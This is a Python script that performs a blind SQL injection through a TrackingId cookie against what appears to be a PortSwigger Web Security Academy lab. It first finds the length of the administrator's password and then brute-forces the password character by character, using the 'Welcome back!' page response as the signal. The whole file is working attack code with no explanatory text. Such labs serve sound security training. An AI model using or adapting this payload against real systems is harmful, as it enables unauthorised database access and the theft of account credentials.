
import requests as rs

# Getting length of password

i = 1
while (True):

    print(i)
    cookie = {
        "TrackingId" : "p913cINETojwtYI6" + "%27and%20%28select%20username%20from%20users%20where%20username%3D%27administrator%27%20and%20length%28password%29%3D{0}%29%3D%27administrator".format(str(i))
    }

    res = rs.request(
        "GET",
        "https://0af100b4035b732786b4f8e8000c00c2.web-security-academy.net/login",
        cookies=cookie
    )

    if "Welcome back!" in res.text:
        break
    else:
        i += 1

# main attack

# getting possible values
lis = ([chr(i) for i in range(97,123)])
lis += [i for i in range(0,10)]
lis += ([chr(i) for i in range(65,91)])

password = ""

# brute force

for i in range(1,21):

    for j in lis:
        print(i,j)
        payload = "%27%20and%20substring%28%28select%20password%20from%20users%20where%20username%3D%27administrator%27%29%2C{0}%2C1%29%3D%27{1}".format(i,j)


        cookie = {"TrackingId" : "p913cINETojwtYI6"  + payload}
            
        res = rs.request("GET","https://0af100b4035b732786b4f8e8000c00c2.web-security-academy.net/login",cookies=cookie)

        if "Welcome back!" in res.text:
            print(j)
            password += str(j)
            break

print(password)
